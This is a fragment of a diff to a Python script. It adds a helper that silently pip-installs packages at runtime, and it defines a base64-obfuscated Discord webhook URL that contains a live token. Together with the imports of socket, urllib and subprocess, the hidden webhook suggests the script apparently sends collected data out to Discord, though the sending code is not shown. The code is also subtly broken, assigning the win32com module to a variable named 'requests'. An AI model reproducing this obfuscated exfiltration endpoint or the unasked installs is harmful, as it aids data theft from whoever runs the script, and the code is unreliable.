@@ -6,9 +6,29 @@ import socket
 import urllib.request
 from time import sleep
 
-import win32com.client
+import sys
 import subprocess
-import re
+import importlib
+
+def ensure_package(package_name, import_name=None):
+    """
+    Ensure a Python package is installed and importable.
+
+    :param package_name: Name used by pip (e.g. 'requests')
+    :param import_name: Name used in import (e.g. 'bs4' for 'beautifulsoup4')
+    """
+    import_name = import_name or package_name
+
+    try:
+        return importlib.import_module(import_name)
+    except ImportError:
+        subprocess.check_call([
+            sys.executable, "-m", "pip", "install", "--upgrade", package_name
+        ])
+        return importlib.import_module(import_name)
+
+# Example usage
+requests = ensure_package("win32com")
 
 # Base64-encoded Discord webhook URL
 WEBHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NDY5MTMzMTgyMDU1NjM5Mi9zeS16UkEzS3NYMFp0U1FMSmowZXVvNlVxR3prbF9OSlRBcGhqZm9BR0E0ck1WN2w4eWNERTFuUG9IU2dsSTQ0am1ESQ=="
